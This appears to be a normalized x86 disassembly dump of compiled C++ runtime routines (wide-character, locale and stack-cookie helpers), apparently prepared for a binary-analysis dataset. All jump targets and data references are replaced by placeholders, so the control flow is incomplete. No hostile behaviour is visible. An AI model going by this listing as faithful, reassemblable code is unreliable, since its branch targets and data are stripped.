push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_1002260b
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_10027160
pop ecx
inc eax
jmp r-xdata
sub_10041891
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
xor edx edx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x20 ] ecx
setne dl
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x10 ] edx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ edi ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov edx [ ebp - 0x14 ]
add ecx 0x8
sub edx eax
cmp edx 0x5
push ecx
push ebx
jl r-xdata
mov eax [ ebx ]
mov [ ebp - 0x1c ] eax
mov eax [ esi ]
movzx eax [ eax ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_100222d1
mov ebx eax
add esp 0x10
test ebx ebx
jl r-xdata
mov ecx [ esi ]
movzx ecx [ ecx ]
push ecx
push eax
call sub_100222d1
add esp 0x10
test eax eax
jl r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x14 ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] eax
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_100272f3
add [ esi ] 0x2
add esp 0x10
add [ edi ] ebx
mov ebx [ ebp - 0x18 ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
sub_10041985
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x18 ] ecx
call sub_100222d1
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x14 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x10
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_100272f3
add esp 0x10
add [ esi ] ebx
sub_10041a1b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_1002260b
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_10027160
pop ecx
inc eax
sub_10041a90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10041658
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041ad5
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_10021ec3
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_10041b14
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
inc esi
inc esi
sub_10041b43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
inc esi
inc esi
sub_10041b89
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100227ec
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10041bd0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002277f
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10041c00
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002260b
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10041c41
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
sub_10041c5f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10027827
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_10041c00
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10041ca2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
mov eax ecx
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_100222d1
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_10041cf5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_10041d18
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_10027827
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_10041ca2
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10041d5f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10041ab3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10041d80
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_10041698
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041dc3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10041da7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10041de4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_100416db
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041e07
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004de8f
add esp 0x14
pop ebp
retn 0x10
sub_10041e28
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041e4b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041e86
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041edf
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_100222d1
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_10041f09
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x2
jae r-xdata
xor ecx ecx
lea eax [ ecx + ecx ]
push eax
call sub_1002738b
pop ecx
leave
retn
push 0x0
lea ecx [ ebp - 0xc ]
call sub_1000233b
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_1002ae74
int3
sub_10041f66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041fc2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_100416db
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10041fe5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movzx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
inc ecx
pop ebp
retn 0x8
sub_10042004
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1004203e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10027827
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10042092
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
inc edx
inc edx
inc esi
inc esi
sub_100420d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_100272f3
add esp 0x10
sub_10042109
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10042092
add esp 0x14
pop ebp
retn 0x10
sub_1004212a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004214d
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] 0x2
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
mov eax [ eax + 0x14 ]
lea eax [ ecx + eax * 2 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1004218a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
neg eax
sbb eax eax
inc eax
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
call sub_10027827
cmp eax [ edi ]
je r-xdata
sub_100421bb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100421de
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10042200
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
xor al al
mov esi [ ecx + 0x18 ]
lea eax [ ecx + 0x4 ]
cmp esi 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp esi 0x8
jb r-xdata
cmp [ ebp + 0x8 ] edx
jb r-xdata
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ eax ]
mov al 0x1
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_1004223f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
lea eax [ edi + edi ]
add [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
lea ecx [ ecx + ebx * 2 ]
lea edx [ edx + edi * 2 ]
pop ebx
cmp edx ecx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_100422bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_10041698
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10042302
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100422e6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10042323
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10041e6e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10042344
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100422a2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10042365
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_100423a5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_10042365
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100423d0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_100423a5
dec [ ebp + 0x1c ]
inc esi
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10042407
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_100423a5
dec [ ebp + 0x1c ]
jne r-xdata
sub_10042432
push 0x14
mov eax sub_1004edbc
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10027b31
mov ecx [ ebp + 0x8 ]
mov edi eax
xor ebx ebx
lea eax [ ebp - 0x20 ]
push eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10007876
push eax
push ebx
push [ edi + 0x8 ]
call sub_10006c37
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10007876
push eax
push ebx
push r--data
call sub_100415bb
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10007876
push eax
push ebx
push r--data
call sub_100415bb
mov ecx [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10007876
push eax
mov eax [ edi ]
movzx eax [ eax ]
push ebx
push eax
call sub_1004158d
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10007876
push eax
mov eax [ edi + 0x4 ]
movzx eax [ eax ]
push ebx
push eax
call sub_1004158d
add esp 0xc
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_1002b37e
retn 0x8
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10007876
push eax
push ebx
push r--data
call sub_10006c37
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call sub_10007876
push eax
push ebx
push 0x2e
call sub_1004158d
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ax
add esp 0xc
lea eax [ ebp - 0x18 ]
push eax
call sub_10007876
push eax
push ebx
push 0x2c
call sub_1004158d
add esp 0xc
mov [ esi + 0xe ] ax
sub_1004256a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi * 2 ]
pop edi
pop esi
pop ebp
retn 0x4
sub_10042597
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0xfffffffc
je r-xdata
add [ esi + 0x4 ] edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10027827
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10027827
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov edx [ esi + 0x4 ]
push ebx
mov ebx [ eax + 0x14 ]
add ebx ecx
add edx edi
cmp edx ebx
pop ebx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp edx eax
jae r-xdata
sub_100425f5
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_10006f37
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10005f27
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_10006d3f
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_10042631
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_10005f27
dec [ ebp + 0x18 ]
jne r-xdata
sub_1004265c
push 0x10
mov eax sub_1004edd7
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10007876
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_10027b31
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10006c37
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10006f91
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10006f91
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10006f91
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_10007340
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_10007340
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_1002b37e
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1002a0f0
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_1002a0f0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_1004178c
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1004178c
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_100427c2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
